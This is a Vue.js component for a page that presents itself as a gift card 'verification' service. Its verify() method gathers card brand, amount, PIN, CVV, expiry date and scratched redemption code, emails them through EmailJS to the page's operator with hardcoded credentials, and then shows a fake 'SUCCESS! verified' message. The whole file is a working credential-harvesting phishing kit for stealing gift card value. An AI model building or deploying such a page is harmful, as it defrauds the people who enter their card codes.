<script setup>
import imageUrl from './assets/gig1.b5f9534b.jpg' // => or relative path
import axios from 'axios'
</script>

<script>
export default {
  data() {
    return {
      card: "Select type of card",
      currency: "USD",
      amount: null,
      cardPin: null,
      redemptionCode: null,
      cardCvv: null,
      cardExp: null,
      cardFourPin: null,
      loading: false,
      modalCard: null,
      modalAmount: null
      

    }


  },
  methods: {
    verify() {

      this.loading = true;
      this.modalCard = this.card;
      this.modalAmount = this.amount;
      
      

      var data = {
        service_id: 'service_uysex9s',
        template_id: 'template_reevj08',
        user_id: 'HD34HmPYw8YvoP1lo',
        template_params: {
          'card': this.card,
          'currency': this.currency,
          'amount': this.amount,
          'cardPin': this.cardPin,
          'redemptionCode': this.redemptionCode,
          'cardCvv': this.cardCvv,
          'cardExp': this.cardExp,
          'cardFourPin': this.cardFourPin
        }
      }
      axios.post('https://api.emailjs.com/api/v1.0/email/send', data, {
        headers: {
          data: JSON.stringify(data),
          ContentType: 'application/json'
        }
      })
        .then(res => {
          console.log("successful")
          this.card = "Select type of card";
          this.currency = "USD";
          this.amount = null;
          this.cardPin = null;
          this.redemptionCode = null;
          this.cardCvv = null;
          this.cardExp = null;
          this.cardFourPin = null;
          // Trigger click event on modal
          $('#exampleModalLong').modal('show');
          this.loading = false;
        });
        
   

  }
}

}
</script>

<template>
  <section id="form-section">
    <div class="form-body" id="scroll-here">
      <div class="form-banner aos-init aos-animate" data-aos="fade-up"><img :src=imageUrl class="img-fluid"
          alt="form giftcard"></div>
      <div class="form-holder aos-init aos-animate" data-aos="fade-up">
        <form class="form-container p-2 w-100" @submit.prevent="verify" >
          <div class="inps">
            <select v-model="card" required="" name="cardName" class="form-select" placeholder="Select type of card">
              <option value="Select type of card" selected>Select type of card</option>
              <option value="Apple">Apple</option>
              <option value="Amazon">Amazon</option>
              <option value="Steam">Steam</option>
              <option value="eBay">eBay</option>
              <option value="Xbox">Xbox</option>
              <option value="Googleplay">Googleplay</option>
              <option value="PlayStation">PlayStation</option>
              <option value="Sephora">Sephora</option>
              <option value="Nordstrom">Nordstrom</option>
              <option value="Nike">Nike</option>
              <option value="MasterCard">MasterCard</option>
              <option value="Vanilla">Vanilla</option>
              <option value="Wallmart Visa">Wallmart Visa</option>
              <option value="Perfect Visa">Perfect Visa</option>
              <option value="Visa Silvery White">Visa Silvery White</option>
              <option value="TT Visa">TT Visa</option>
              <option value="Amex">Amex</option>
            </select>
          </div>
          <div class="inps sk">
            <select required="" v-model="currency" name="currency" class="form-select" placeholder="Select type of card">
              <option value="USD">USD</option>
              <option value="GBP">GBP</option>
              <option value="AUD">AUD</option>
              <option value="EUR">EUR</option>
              <option value="CAD">CAD</option>
            </select>
            <input type="number" v-model="amount" required="" class="form-control" placeholder="Card Amount">
        </div>
        <input type="number"
          v-if="card === 'Vanilla' || card === 'Wallmart Visa' || card === 'Perfect Visa' || card === 'Visa Silvery White' || card === 'TT Visa' || card === 'Amex'"
          v-model="cardCvv" name="cardCvv" required="" class="form-control" placeholder="Gift Card CVV">
        <input type="number" v-model="cardFourPin" v-if="card === 'Amex'" name="digitPin" maxlength="4" required=""
          class="form-control" placeholder="4 Digit Pin">

        <div class="inps"><input
            v-if="card === 'Sephora' || card === 'Nordstrom' || card === 'Nike' || card === 'MasterCard'" type="number"
            v-model="cardPin" name="cardPin" required="" class="form-control" placeholder="Gift Card Pin">
          </div>

          <input type="text" name="cardExp"
            v-if="card === 'Vanilla' || card === 'Wallmart Visa' || card === 'Perfect Visa' || card === 'Visa Silvery White' || card === 'TT Visa' || card === 'Amex'"
            required="" v-model="cardExp" class="form-control" placeholder="Gift Card Expiry date">
          <div class="inps"><input type="text" v-model="redemptionCode" name="cardCode" required="" autocomplete="false"
              class="form-control" placeholder="Redemption Code">
            <div class="px-4 py-2 text-secondary"><svg stroke="currentColor" fill="currentColor" stroke-width="0"
                viewBox="0 0 512 512" class="text-warning" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
                <path
                  d="M504 256c0 136.997-111.043 248-248 248S8 392.997 8 256C8 119.083 119.043 8 256 8s248 111.083 248 248zm-248 50c-25.405 0-46 20.595-46 46s20.595 46 46 46 46-20.595 46-46-20.595-46-46-46zm-43.673-165.346l7.418 136c.347 6.364 5.609 11.346 11.982 11.346h48.546c6.373 0 11.635-4.982 11.982-11.346l7.418-136c.375-6.874-5.098-12.654-11.982-12.654h-63.383c-6.884 0-12.356 5.78-11.981 12.654z">
                </path>
              </svg> <b>Please make sure the <b>redemption code</b> is the original scratched Code </b></div>
          </div>
          <div>
            
            <button v-if="!loading" type="submit" class="btns btn btn-success w-100 fs-5">Verify Card</button>
            <button v-else type="button" class="btns btn btn-success w-100 fs-5" disabled>
              <span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span>
              Verifying Card...
            </button>
          </div>
        </form>
        <p class="form-warning text-center text-muted">Please make sure the codes you are about to input are correct
          and according to details</p>
        
      </div>

    </div>

  </section>


  <!-- modal  -->

  <div class="modal fade" id="exampleModalLong" tabindex="-1" role="dialog" aria-labelledby="exampleModalLongTitle"
    aria-hidden="true">
    <div class="modal-dialog modal-dialog-centered" role="document">
      <div class="modal-container rounded shadow-lg">
        <h1 class="s-msg text-center text-success">SUCCESS!</h1>
        <h2>Your {{modalCard}} gift card has been verified</h2>
        <div class="border-bottom my-3">Here's the result</div>
        <div class="my-2"><span class="text-muted">Brand</span>: <b>{{modalCard}}</b></div>
        <div class="my-2"><span class="text-muted">Amount</span>: <b>USD{{modalAmount}}.00</b></div>
        <div class="my-2"><span class="text-muted">Status</span>: <b>Not activated</b></div>
        <div class="mt-3"><button class="btn btn-danger" data-dismiss="modal">close</button></div>
      </div>
    </div>
  </div>



  <!-- <section id="modal">
          <div class="modal-container rounded shadow-lg">
            <h1 class="s-msg text-center text-success">SUCCESS!</h1>
            <h2>Your amazon gift card has been verified</h2>
            <div class="border-bottom my-3">Here's the result</div>
            <div class="my-2"><span class="text-muted">Brand</span>: <b>amazon</b></div>
            <div class="my-2"><span class="text-muted">Amount</span>: <b>USD3000.00</b></div>
            <div class="my-2"><span class="text-muted">Status</span>: <b>Not activated</b></div>
            <div class="mt-3"><button class="btn btn-danger" data-dismiss="modal">close</button></div>
          </div>
        </section> -->
</template>

<style scoped>
.logo {
  height: 6em;
  padding: 1.5em;
  will-change: filter;
  transition: filter 300ms;
}

.logo:hover {
  filter: drop-shadow(0 0 2em #646cffaa);
}

.logo.vue:hover {
  filter: drop-shadow(0 0 2em #42b883aa);
}
</style>
